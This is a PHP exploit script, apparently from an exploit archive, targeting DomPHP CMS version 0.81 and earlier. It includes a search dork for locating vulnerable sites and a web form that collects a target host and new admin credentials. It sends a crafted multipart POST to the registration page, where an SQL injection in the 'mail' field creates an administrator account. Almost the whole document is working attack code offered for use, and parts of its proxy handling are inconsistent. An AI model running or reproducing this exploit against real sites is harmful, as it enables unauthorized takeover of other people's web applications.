DomPHP <= 0.81 Remote Add Administrator Exploit
===============================================




<?php
/*
 *    DomPHP <= 0.81 Remote Add Administrator Exploit
 *    c0ded by j0j0
 *    dork: "Site cree a l&#039;aide du CMS DomPHP"
 *
 *    Exploit work with CURL
*/

error_reporting(0);
ini_set(&#039;max_execution_time&#039;, 0);
ini_set(&#039;default_socket_timeout&#039;, 5);
ob_implicit_flush(true);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
    }
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}


class exploit {
    function connect($host,$port=80) {
        echo &#039;[*] Trying to connect to &#039;.$host.&#039;:&#039;.$port.&#039;... &#039;;
        $fp = @fsockopen($host, $port, $errno, $errstr, 4);
        switch($fp) {
            case true: echo &#039;OK&#039;; break;
            case false: echo &#039;ERROR&#039;; break;
        }
        echo &#039;<br />&#039;."\n";
        return $fp;
    }
}
?>

<html>
<head>
<style type="text/css">
body {
    margin:3%;
    font-size:10px;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    background-color:#1a1a1a;
    text-align: center;
}
input {
    background:#303030;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    font-size:10px;
    vertical-align:middle;
    border-left:1px solid #5d5d5d;
    border-right:1px solid #121212;
    border-bottom:1px solid #121212;
    border-top:1px solid #5d5d5d;
    padding: 3px;
    margin: 2px;
}
input[type=text] {
    width: 200px;
}
textarea {
    background:#303030;
    color:#FFFFFF;
    font-family:Verdana,Arial;
    font-size:10px;
    vertical-align:middle;
    border-left:1px solid #121212;
    border-right:1px solid #5d5d5d;
    border-bottom:1px solid #5d5d5d;
    border-top:1px solid #121212;
}
table td {
    font-size: 10px;
    font-family: Verdana, Arial;
}
h3 { color: #CC0000; }
a {
    color: #999999;
    text-decoration: none;
    font-weight: bold;
}
#exploit {
    font-family: Courier New, sans-ms;
    font-size: 12px;
    color: #00FF00;
    width: 400px;
    text-align: left;
}
</style>
</head>
<body>
<h3>DomPHP <= 0.81 Remote Add Administrator Exploit<br /><br />-= c0ded by j0j0 =-</h3>
<br />
<center><table><tr><td><ul>
# Download&#039;>http://">Download DomPHP 0.81

# Visit&#039;>http://">Visit DomPHP Website

</ul></td></tr></table></center>
<br />
<form method="post" action="domphp.php">
<?php
$host = isset($_POST[&#039;host&#039;]) ? $_POST[&#039;host&#039;] : &#039;localhost&#039;;
$proxy = isset($_POST[&#039;proxy&#039;]) ? $_POST[&#039;proxy&#039;] : &#039;&#039;;
$path = isset($_POST[&#039;path&#039;]) ? $_POST[&#039;path&#039;] : &#039;/domphp/&#039;;
$version = isset($_POST[&#039;version&#039;]) ? $_POST[&#039;version&#039;] : &#039;0.81&#039;;
$newAdminUsername = isset($_POST[&#039;newAdminUsername&#039;]) ? $_POST[&#039;newAdminUsername&#039;] : &#039;j0j0&#039;;
$newAdminPassword = isset($_POST[&#039;newAdminPassword&#039;]) ? $_POST[&#039;newAdminPassword&#039;] : &#039;h4ck3d&#039;;
?>
<center>
<table>
<tr>
    <td>Host :</td>
    <td><input name="host" type="text" value="<?php echo $host; ?>" /></td>
</tr>
<tr>
    <td>Proxy* :</td>
    <td><input name="proxy" type="text" value="<?php echo $proxy; ?>" /></td>
</tr>
<tr>
    <td>Path to DomPHP :</td>
    <td><input name="path" type="text" value="<?php echo $path; ?>" /></td>
</tr>
<tr>
    <td>DomPHP Version :</td>
    <td><input name="version" type="text" value="<?php echo $version; ?>" /></td>
</tr>
<tr>
    <td>New admin username :</td>
    <td><input name="newAdminUsername" type="text" value="<?php echo $newAdminUsername; ?>" /></td>
</tr>
<tr>
    <td>New admin password :</td>
    <td><input name="newAdminPassword" type="text" value="<?php echo $newAdminPassword; ?>" /></td>
</tr>
<tr>
    <td></td>
    <td><input name="xpl" type="submit" value="Send Exploit"></td>
</tr>
</table>
<i>* : opptional</i>
</center>
</form>

<br />
<?php
if($_POST[&#039;xpl&#039;]) {
$err=0;
foreach($_POST as $key=>$value) {
    if(empty($value) && $key != &#039;proxy&#039;) {
        echo $key .&#039; is empty !<br />&#039;;
        $err++;
    }
}
if($err > 0) { die(); }
extract($_POST);

echo &#039;<center>&#039;."\n".&#039;<div id="exploit">&#039;."\n";

while(exploit::connect($host, 80) === FALSE) {
/* Try to connect to {$host} */
}

if(!empty($proxy)) {
$proxyHost = parse_url($proxy, PHP_URL_HOST);
$proxyPort = parse_url($proxy, PHP_URL_PORT);
if(empty($proxyHost) || empty($proxyPort)) {
    echo &#039;[*] Bad proxy ! I won\&#039;t use proxy to send exploit.<br />&#039;."\n";
    unset($proxyHost, $proxyPort);
    $proxy = &#039;&#039;;
}
else {
    $proxyConnect = exploit::connect($proxyHost, $proxyPort);
    if($proxyConnect === FALSE) {
        echo &#039;[*] Bad proxy ! I won\&#039;t use proxy to send exploit.<br />&#039;."\n";
        unset($proxyHost, $proxyPort);
        $proxy = &#039;&#039;;
    }
}
}

$port=80;
$proxy="";
for ($i=7; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

if($version == &#039;0.81&#039;) { $pass1 = 1000; $pass2 = 1000; }
else {
    $pass1 = &#039;&#039;;
    $pass2 = &#039;&#039;;
}

$data.=&#039;-----------------------------7d6224c08dc

Dom
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="nom"

PHP
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="mail"

h4ck\&#039;, loginUtilisateur=\&#039;&#039;.urlencode($newAdminUsername).&#039;\&#039;, passUtilisateur=PASSWORD(\&#039;&#039;.urlencode($newAdminPassword).&#039;\&#039;), statutUtilisateur=\&#039;admin\&#039;, siteUtilisateur=\&#039;\&#039;, urlUtilisateur=\&#039;\&#039;, descUtilisateur=\&#039;\&#039;, metierUtilisateur=\&#039;\&#039;, villeUtilisateur=\&#039;\&#039;, contact=\&#039;1\&#039; /*
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="newlogin"

j0j0
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="pass1"

&#039;.$pass1.&#039;
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="pass2"

&#039;.$pass2.&#039;
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="ville"

DomPHP
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="metier"

hacker
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="site"

google.com
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="url"

http://www.google.com
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="id_utilisateur"


-----------------------------7d6224c08dc
Content-Disposition: form-data; name="adressemail"


-----------------------------7d6224c08dc
Content-Disposition: form-data; name="change_pass"


-----------------------------7d6224c08dc
Content-Disposition: form-data; name="B1"

Envoyer
-----------------------------7d6224c08dc
&#039;;

$packet ="POST ".$path."/welcome/inscription.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
if(strstr($html, &#039;404 Not Found&#039;)) {
    echo &#039;[*] 404 not found :( (certainly the path)&#039;;
}
elseif(strstr($html, &#039;erreur.php&#039;)) {
    echo &#039;[*] Exploit failed :(<br />&#039;;
}
else {
    echo &#039;[*] New admin created :)<br />&#039;;
}
}

?>
</div>
</center>
</body>
</html>



